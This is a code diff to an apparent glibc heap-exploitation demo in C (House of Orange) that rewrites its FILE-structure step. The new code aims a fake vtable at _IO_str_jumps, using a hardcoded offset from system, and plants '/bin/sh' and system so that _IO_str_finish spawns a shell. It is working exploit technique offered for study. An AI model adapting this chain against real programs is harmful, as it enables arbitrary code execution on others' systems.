@@ -1,3 +1,4 @@
+// 修改参照https://xz.aliyun.com/t/2411
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -176,7 +177,7 @@ int main()
       If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
     */
 
-    memcpy( ( char *) top, "/bin/sh\x00", 8);
+    //memcpy( ( char *) top, "/bin/sh\x00", 8);
 
     /*
       The function _IO_flush_all_lockp iterates through the file pointer linked-list
@@ -227,6 +228,7 @@ int main()
     */
 
     fp->_mode = 0; // top+0xc0
+    fp->_flags = 0;
 
 
     /*
@@ -245,9 +247,54 @@ int main()
          4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
     */
 
-    size_t *jump_table = &top[12]; // controlled memory
-    jump_table[3] = (size_t) &winner;
-    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
+    //size_t *jump_table = &top[12]; // controlled memory
+    //jump_table[3] = (size_t) &winner;
+
+    size_t system_addr = (size_t) system;
+    size_t _IO_str_jumps_addr = system_addr + 0x357080;
+
+    // 设置vtable:这样调用_IO_overflow时会调用到 _IO_str_finish
+    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = _IO_str_jumps_addr - 8; // top+0xd8
+
+/*
+typedef void *(*_IO_alloc_type) (_IO_size_t);
+typedef void (*_IO_free_type) (void*);
+
+struct _IO_str_fields
+{
+  _IO_alloc_type _allocate_buffer;
+  _IO_free_type _free_buffer;
+};
+
+struct _IO_streambuf
+{
+  struct _IO_FILE _f;
+  const struct _IO_jump_t *vtable;
+};
+
+typedef struct _IO_strfile_
+{
+  struct _IO_streambuf _sbf;
+  struct _IO_str_fields _s;
+} _IO_strfile;
+
+
+void
+_IO_str_finish (_IO_FILE *fp, int dummy)
+{
+  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
+    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
+  fp->_IO_buf_base = NULL;
+
+  _IO_default_finish (fp, 0);
+}
+
+*/
+    fp->_IO_buf_base = "/bin/sh";
+    top[29] = (size_t)system_addr; // top+0xe8
+
+
+
 
 
     /* Finally, trigger the whole chain by calling malloc */
